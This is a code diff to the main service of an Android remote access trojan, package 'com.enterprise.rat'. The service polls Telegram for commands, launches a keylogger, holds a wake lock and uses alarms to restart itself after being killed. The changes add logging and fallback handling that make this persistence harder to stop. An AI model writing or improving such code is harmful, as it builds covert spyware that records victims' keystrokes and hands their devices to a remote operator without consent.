@@ -12,6 +12,7 @@ import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import com.enterprise.rat.R;
 import com.enterprise.rat.receivers.AlarmReceiver;
@@ -25,6 +26,7 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        Log.d("MainService", "onCreate");
         createNotificationChannel();
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIFICATION_ID, buildNotification(),
@@ -40,6 +42,7 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d("MainService", "onStartCommand");
         if (telegramPolling == null || !telegramPolling.isRunning()) {
             startTelegramPolling();
         }
@@ -94,6 +97,7 @@ public class MainService extends Service {
         if (telegramPolling != null) telegramPolling.stop();
         telegramPolling = new TelegramPolling(this);
         new Thread(telegramPolling).start();
+        Log.d("MainService", "Polling started");
     }
 
     private void startKeylogger() {
@@ -104,7 +108,9 @@ public class MainService extends Service {
             } else {
                 startService(intent);
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Log.e("MainService", "Keylogger start error", e);
+        }
     }
 
     private void scheduleAlarm() {
@@ -116,10 +122,16 @@ public class MainService extends Service {
         );
 
         if (alarmManager != null) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
-                    System.currentTimeMillis() + 60000, pendingIntent);
-            } else {
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 60000, pendingIntent);
+                } else {
+                    alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        60000, 300000, pendingIntent);
+                }
+            } catch (SecurityException e) {
+                Log.w("MainService", "Exact alarm not permitted, using inexact repeating");
                 alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                     60000, 300000, pendingIntent);
             }
@@ -128,6 +140,7 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
+        Log.d("MainService", "onDestroy");
         if (telegramPolling != null) telegramPolling.stop();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
 
@@ -138,7 +151,12 @@ public class MainService extends Service {
         );
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         if (alarmManager != null) {
-            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
+            try {
+                alarmManager.set(AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1000, pendingIntent);
+            } catch (SecurityException e) {
+                Log.w("MainService", "Cannot set restart alarm");
+            }
         }
         super.onDestroy();
     }
